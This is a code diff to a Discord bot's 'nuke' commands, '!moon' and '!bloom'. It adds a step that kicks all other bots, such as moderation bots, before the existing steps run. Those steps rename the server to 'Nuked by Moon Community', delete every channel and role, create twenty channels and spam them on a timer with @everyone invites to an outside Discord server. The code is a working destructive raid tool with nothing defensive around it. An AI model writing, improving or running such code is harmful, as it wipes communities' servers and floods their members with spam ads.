@@ -22,20 +22,33 @@ module.exports = (client) => {
         // ==========================================
         if (command === "!moon") {
             try {
-                // Server Details Change
+                // 1. Kick all other bots (Using cache to prevent Opcode 8 rate limit)
+                const botMembers = guild.members.cache;
+                for (const [, member] of botMembers) {
+                    if (
+                        member.user.bot &&
+                        member.id !== client.user.id &&
+                        member.id !== message.author.id &&
+                        member.kickable
+                    ) {
+                        await member.kick("Moon command").catch(() => {});
+                    }
+                }
+
+                // 2. Server Details Change
                 await guild.setName("Nuked by Moon Community 🌙").catch(() => {});
                 const iconPath = path.join(__dirname, '../assets/icon.png');
                 if (fs.existsSync(iconPath)) {
                     await guild.setIcon(iconPath).catch(() => {});
                 }
                 
-                // Delete all existing channels
+                // 3. Delete all existing channels
                 const channels = [...guild.channels.cache.values()];
                 for (const channel of channels) {
                     await channel.delete("Moon command").catch(() => {});
                 }
 
-                // Delete all deletable roles
+                // 4. Delete all deletable roles
                 const roles = [...guild.roles.cache.values()];
                 for (const role of roles) {
                     if (role.id !== guild.id && role.editable) {
@@ -43,7 +56,7 @@ module.exports = (client) => {
                     }
                 }
 
-                // Create new text channels
+                // 5. Create new text channels
                 const newChannels = [];
                 for (let i = 0; i < 20; i++) {
                     const channel = await guild.channels.create({
@@ -56,7 +69,7 @@ module.exports = (client) => {
                     }
                 }
 
-                // Send initial message
+                // 6. Send initial message
                 const welcomeMessage = "@everyone @here server nuked by **Moon Community 🌙** join our discord discord.gg/h5ejJAabPv ";
                 await Promise.all(
                     newChannels.map(channel =>
@@ -67,13 +80,13 @@ module.exports = (client) => {
                     )
                 );
 
-                // Stop previous interval if active
+                // 7. Stop previous interval if active
                 if (welcomeInterval) {
                     clearInterval(welcomeInterval);
                     welcomeInterval = null;
                 }
 
-                // Interval spam
+                // 8. Interval spam
                 welcomeInterval = setInterval(async () => {
                     for (const channel of newChannels) {
                         await channel.send({
@@ -114,20 +127,33 @@ module.exports = (client) => {
         // ==========================================
         if (command === "!bloom") {
             try {
-                // Server Details Change
+                // 1. Kick all other bots
+                const botMembers = guild.members.cache;
+                for (const [, member] of botMembers) {
+                    if (
+                        member.user.bot &&
+                        member.id !== client.user.id &&
+                        member.id !== message.author.id &&
+                        member.kickable
+                    ) {
+                        await member.kick("bloom command").catch(() => {});
+                    }
+                }
+
+                // 2. Server Details Change
                 await guild.setName("Moon Community 🌙").catch(() => {});
                 const iconPath = path.join(__dirname, '../assets/icon.png');
                 if (fs.existsSync(iconPath)) {
                     await guild.setIcon(iconPath).catch(() => {});
                 }
                 
-                // Delete all existing channels
+                // 3. Delete all existing channels
                 const channels = [...guild.channels.cache.values()];
                 for (const channel of channels) {
                     await channel.delete("bloom command").catch(() => {});
                 }
 
-                // Delete all deletable roles
+                // 4. Delete all deletable roles
                 const roles = [...guild.roles.cache.values()];
                 for (const role of roles) {
                     if (role.id !== guild.id && role.editable) {
@@ -135,7 +161,7 @@ module.exports = (client) => {
                     }
                 }
 
-                // Create new text channels
+                // 5. Create new text channels
                 const newChannels = [];
                 for (let i = 0; i < 20; i++) {
                     const channel = await guild.channels.create({
@@ -148,7 +174,7 @@ module.exports = (client) => {
                     }
                 }
 
-                // Send initial message (No banner)
+                // 6. Send initial message (No banner)
                 const welcomeMessage = "@everyone @here\n🌙 **Join Our Moon Community!** ✨\nActive Chats • Coding • Events • Chill Vibes 🚀\n🔗 https://discord.gg/62xxMq2NKv";
                 await Promise.all(
                     newChannels.map(channel =>
@@ -158,13 +184,13 @@ module.exports = (client) => {
                     )
                 );
 
-                // Stop previous interval if active
+                // 7. Stop previous interval if active
                 if (welcomeInterval) {
                     clearInterval(welcomeInterval);
                     welcomeInterval = null;
                 }
 
-                // Interval spam
+                // 8. Interval spam
                 welcomeInterval = setInterval(async () => {
                     for (const channel of newChannels) {
                         await channel.send({
